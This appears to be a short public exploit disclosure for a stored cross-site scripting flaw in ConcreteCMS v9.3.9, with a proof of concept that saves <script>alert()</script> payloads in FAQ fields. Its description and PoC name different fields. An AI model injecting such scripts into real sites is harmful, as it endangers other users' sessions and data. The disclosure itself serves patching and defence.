# Exploit Title: Concretecms v9.3.9 - Cross-Site Scripting (XSS)
## Date: 3/14/2025
## Vendor Homepage: https://github.com/concretecms/concretecms
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Concretecms
## Version: v9.3.9
## Exploit Description:
## ConcreteCMS v9.3.9 suffers from a Stored Cross-Site Scripting (XSS) vulnerability in the Question field when adding a FAQ. This vulnerability allows attackers to cheat other users by injecting malicious scripts into web pages viewed by other users.

## ---------------------------------POC-----------------------------

```
<script>alert('Navigation Link Text');</script>
<script>alert('Title Text');</script>
<script>alert('Description');</script>
```

While editing the FAQ, add <script>alert('...');</script> to the Navigation Link Text field、Title Text、Description(source) and then click save,the xss vulnerability appears.

